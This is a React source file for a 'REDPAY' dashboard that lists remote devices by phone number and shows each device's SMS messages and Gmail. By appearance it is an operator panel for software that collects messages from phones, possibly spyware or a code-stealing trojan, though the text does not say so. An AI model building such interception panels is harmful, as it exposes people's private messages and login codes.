import React, { useEffect, useMemo, useState, Suspense } from 'react'
import { useNavigate } from 'react-router-dom'
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/component/ui/tabs'
import { Card, CardContent } from '@/component/ui/card'
import { Button } from '@/component/ui/button'
import { Loader, LogOut } from 'lucide-react'
import { getSession, clearSession } from '@/lib/auth'
import { useDashboardDevices, useDashboardMessages } from '@/hooks/dashboard'
import { getDefaultProcessor } from '@/lib/message-processors'
import type { User } from '@/pages/dashboard/types'
import { MessagesSection } from '@/pages/dashboard/components/MessagesSection'
import { LazyGmailSection as GmailSection } from '@/pages/dashboard/sections/lazy'

const Spinner = () => (
  <div className="flex items-center justify-center p-8">
    <Loader className="h-6 w-6 animate-spin text-muted-foreground" />
  </div>
)

function formatDateSafe(value: string | number): string {
  try {
    const numeric = typeof value === 'string' ? parseInt(value, 10) : value
    if (!Number.isNaN(numeric) && numeric > 0) {
      const d = new Date(numeric)
      if (!Number.isNaN(d.getTime())) return d.toLocaleString('en-US')
    }
    if (typeof value === 'string') {
      const d = new Date(value)
      if (!Number.isNaN(d.getTime())) return d.toLocaleString('en-US')
    }
    return String(value)
  } catch {
    return String(value)
  }
}

function formatMessageTimestamp(timestamp: number | string): string {
  return formatDateSafe(typeof timestamp === 'number' ? timestamp.toString() : timestamp)
}

export function RedpayDashboard(): React.ReactElement {
  const navigate = useNavigate()
  const session = getSession()
  const sessionEmail = session?.email ?? null

  const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null)
  const [activeTab, setActiveTab] = useState<'messages' | 'gmail'>('messages')

  // Hard auth guard: if no session email, redirect to login
  useEffect(() => {
    if (!sessionEmail) {
      navigate('/login', { replace: true })
    }
  }, [sessionEmail, navigate])

  const {
    devices,
    loading: devicesLoading,
    error: devicesError,
  } = useDashboardDevices({
    sessionEmail,
    refreshTrigger: 0,
  })

  // Select first device automatically when list loads
  useEffect(() => {
    if (!selectedDeviceId && devices.length > 0) {
      setSelectedDeviceId(devices[0].id)
    }
  }, [devices, selectedDeviceId])

  const currentDevice: User | null = useMemo(
    () => (selectedDeviceId ? devices.find(d => d.id === selectedDeviceId) ?? null : null),
    [devices, selectedDeviceId]
  )

  const defaultProcessor = useMemo(() => getDefaultProcessor(), [])

  const {
    messages: sms,
    rawMessages: rawSms,
    loading: messagesLoading,
    error: messagesError,
    isConnected,
    refresh: refreshMessages,
  } = useDashboardMessages({
    deviceId: selectedDeviceId,
    dataLimit: 30, // REDPAY: smaller limit for faster load
    selectedProcessor: defaultProcessor!,
    processorInput: '',
    activeTab: activeTab === 'messages' ? 'sms' : undefined,
  })

  const handleLogout = () => {
    clearSession()
    navigate('/login', { replace: true })
  }

  return (
    <div className="min-h-screen bg-slate-50 flex">
      {/* Device sidebar */}
      <aside className="w-64 border-r border-slate-200 bg-white/80 backdrop-blur-md flex flex-col">
        <div className="px-4 py-3 border-b border-slate-200">
          <h1 className="text-lg font-semibold tracking-tight">REDPAY</h1>
          <p className="text-xs text-slate-500">Devices</p>
        </div>
        <div className="flex-1 overflow-auto">
          {devicesLoading && devices.length === 0 ? (
            <Spinner />
          ) : devicesError ? (
            <div className="p-4 text-xs text-red-600">{devicesError}</div>
          ) : devices.length === 0 ? (
            <div className="p-4 text-xs text-slate-500">No devices found.</div>
          ) : (
            <ul className="p-2 space-y-1">
              {devices.map(device => {
                const isActive = device.id === selectedDeviceId
                return (
                  <li key={device.id}>
                    <button
                      type="button"
                      onClick={() => {
                        setSelectedDeviceId(device.id)
                      }}
                      className={[
                        'w-full text-left px-3 py-2 rounded-md text-xs transition',
                        isActive
                          ? 'bg-primary text-primary-foreground shadow-sm'
                          : 'hover:bg-slate-100 text-slate-700',
                      ].join(' ')}
                    >
                      <div className="flex items-center justify-between gap-2">
                        <span className="font-medium truncate">{device.device || device.id}</span>
                        {device.isOnline && (
                          <span className="inline-flex h-2 w-2 rounded-full bg-emerald-500" />
                        )}
                      </div>
                      {device.phone && (
                        <div className="text-[10px] text-slate-500 truncate">{device.phone}</div>
                      )}
                    </button>
                  </li>
                )
              })}
            </ul>
          )}
        </div>
      </aside>

      {/* Main content */}
      <main className="flex-1 flex flex-col">
        <header className="px-6 py-4 border-b border-slate-200 flex items-center justify-between bg-white/80 backdrop-blur-md">
          <div>
            <h2 className="text-base font-semibold">
              {currentDevice?.device || selectedDeviceId || 'Select a device'}
            </h2>
            <p className="text-xs text-slate-500">
              {currentDevice?.phone ? `Phone: ${currentDevice.phone}` : 'Waiting for device selection'}
            </p>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              disabled={!selectedDeviceId || messagesLoading}
              onClick={() => refreshMessages()}
            >
              Refresh
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={handleLogout}
              className="text-xs text-slate-600 hover:text-red-600"
            >
              <LogOut className="h-4 w-4 mr-1" />
              Logout
            </Button>
          </div>
        </header>

        <section className="flex-1 p-4">
          {!selectedDeviceId ? (
            <Card>
              <CardContent className="p-8 text-center text-slate-500 text-sm">
                Select a device from the left to view messages and Gmail.
              </CardContent>
            </Card>
          ) : (
            <Tabs value={activeTab} onValueChange={v => setActiveTab(v as 'messages' | 'gmail')} className="h-full">
              <TabsList className="mb-4">
                <TabsTrigger value="messages" className="text-xs sm:text-sm">
                  Messages
                </TabsTrigger>
                <TabsTrigger value="gmail" className="text-xs sm:text-sm">
                  Gmail
                </TabsTrigger>
              </TabsList>

              <TabsContent value="messages" className="h-full">
                <MessagesSection
                  deviceId={selectedDeviceId}
                  messages={sms}
                  rawMessages={rawSms}
                  loading={messagesLoading}
                  error={messagesError}
                  isConnected={isConnected}
                  isAdmin={true}
                  onRetry={refreshMessages}
                  formatMessageTimestamp={formatMessageTimestamp}
                  defaultMessageLimit={30}
                  title="Messages"
                />
              </TabsContent>

              <TabsContent value="gmail" className="h-full">
                <Suspense fallback={<Spinner />}>
                  <GmailSection deviceId={selectedDeviceId} isAdmin={true} />
                </Suspense>
              </TabsContent>
            </Tabs>
          )}
        </section>
      </main>
    </div>
  )
}

export default RedpayDashboard

